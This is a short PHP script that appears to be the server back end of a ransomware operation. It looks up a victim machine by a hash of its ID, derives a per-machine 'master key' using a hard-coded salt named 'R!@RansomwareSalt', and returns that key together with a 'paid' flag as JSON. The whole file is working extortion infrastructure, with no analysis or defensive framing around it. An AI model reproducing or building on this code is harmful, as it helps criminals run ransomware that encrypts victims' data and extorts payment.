<?php

require_once "connect.php";

if (isset($_GET["machineId"]) && !empty(trim($_GET["machineId"]))) {
  $input_machineId = hash("sha256", $_GET["machineId"]);
  $exists = false;
  $sql = "SELECT * FROM clients WHERE machineHash = ?";

  if ($stmt = mysqli_prepare($link, $sql)) {
    mysqli_stmt_bind_param($stmt, "s", $input_machineId);

    if (mysqli_stmt_execute($stmt)) {
      $result = mysqli_stmt_get_result($stmt);
      if (mysqli_num_rows($result) >= 1) {
        while ($row = mysqli_fetch_array($result)) {
          $salt = "R!@RansomwareSalt";
          $combined = $input_machineId . $salt;
          $masterKey = hash("sha256", $combined);
          $hasPaid = $row['hasPaid'];

          //echo "key: " . $masterKey . " paid: " . $hasPaid;
          $arrayData = array(array(
            'key' => $masterKey,
            'paid' => strval($hasPaid)
          ));
          //$data = ['key' => $masterKey, 'paid' => $hasPaid];
          header('Content-Type: application/json; charset=utf-8');
          echo json_encode($arrayData);
          exit();
        }
      }
    }
  }
}
